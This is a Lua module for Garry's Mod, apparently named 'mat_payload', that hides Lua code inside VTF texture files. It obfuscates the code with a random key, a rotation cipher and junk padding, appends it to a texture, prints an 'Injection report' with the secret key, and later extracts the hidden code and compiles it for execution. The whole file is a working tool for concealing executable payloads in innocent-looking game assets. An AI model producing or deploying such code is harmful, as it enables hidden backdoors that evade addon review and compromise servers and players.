module( "mat_payload", package.seeall )



local emptyVTF = "\x56\x54\x46\x00\x07\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x01\x00\x01\x00\x00\x03\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x3f\x00\x00\x80\x3f\x00\x00\x80\x3f\x00\x00\x00\x00\x00\x00\x80\x3f\x05\x00\x00\x00\x01\xff\xff\xff\xff\x00\x00\x01\x00"




local function rotChar177(letter_byte, addition)
	addition = addition % 177
	return (letter_byte + addition) % 177
end

local function unRotChar177(letter_byte, soustraction)
	soustraction = soustraction % 177
	return (letter_byte - soustraction) % 177
end


-- rip ram, we don't have stringBuilder here


local lenKeyToGen = 128

local function genRandomKey()
	local out = {}
	local i = 1
	while (i <= lenKeyToGen) do
		out[i] = math.random(33,126)
		i = i + 1
	end
	--should have used table.concat but whatever
	return string.char(unpack(out))

end



local function obfuscatePayload(str_lua_code)
	local key = genRandomKey()
	local keySum = tonumber(util.CRC(key))
	local keylen = string.len(key)
	local code_len = string.len(str_lua_code)
	local codeTBL = {string.byte(str_lua_code, 1, code_len)}
	local codedPayload = ""
	local i = 1

	while (i <= code_len) do
		local i2 = 1

		-- strings concat could probably use table.concat instead
		local toadd = string.byte(key[(i % (keylen - 1)) + 1])
		while (i2 <= toadd) do
			codedPayload = codedPayload .. string.char(math.random(177))
			i2 = i2 + 1
		end

		codedPayload = codedPayload .. string.char(rotChar177(codeTBL[i], keySum))
		i = i + 1
	end
	return codedPayload, key
end


local function desObfuscatePayload(obfuscated_code, key)
	local keySum = tonumber(util.CRC(key))
	local code_len = string.len(obfuscated_code)
	local keylen = string.len(key)
	local i = 1
	local real_i = 1
	local code = {}

	while (i <= code_len) do
		i = i + string.byte(key[(real_i % (keylen - 1)) + 1])
		code[real_i] = unRotChar177(string.byte(obfuscated_code[i]), keySum)

		real_i = real_i + 1
		i = i + 1
	end

	return string.char(unpack(code))
end


function WriteCodeToVTF(identifier, str_lua_code, custom_vtf_path)

	local base_VTF = emptyVTF
	local payload, secretKey = obfuscatePayload(str_lua_code)
	local filename = identifier .. ".vtf"


	if (custom_vtf_path) then
		base_VTF = file.Read(custom_vtf_path, "BASE_PATH")
	end
	file.Write(filename, base_VTF .. payload)
	MsgC(Color(50,255,50), "███████VTF Injection report███████\n")
	MsgC(Color(100,255,100), "\tWrote to file : ")
	MsgC(Color(255,255,100), string.format("\t[garrysmod/data/%s]\n", filename))
	MsgC(Color(100,255,100), "\tSecret key : ")
	MsgC(Color(255,255,100), string.format("\t%s\n", secretKey))
	MsgC(Color(100,255,100), "\tVTF offset : ")
	MsgC(Color(255,255,100), string.format("\t%s\n", string.len(base_VTF)))
	MsgC(Color(50,255,50), "███████VTF Injection report END███████\n")

	return secretKey, string.len(base_VTF)
end


function ReadCodeFromVTF(texture_path, secret_key, vtf_len)
	local f = file.Open(texture_path, "rb", "BASE_PATH")

	if (not f) then
		return
	end
	f:Skip(vtf_len)
	local payload = f:Read(f:Size() - vtf_len)
	f:Close()
	local code = desObfuscatePayload(payload, secret_key)
	return CompileString(code,texture_path, false)

end
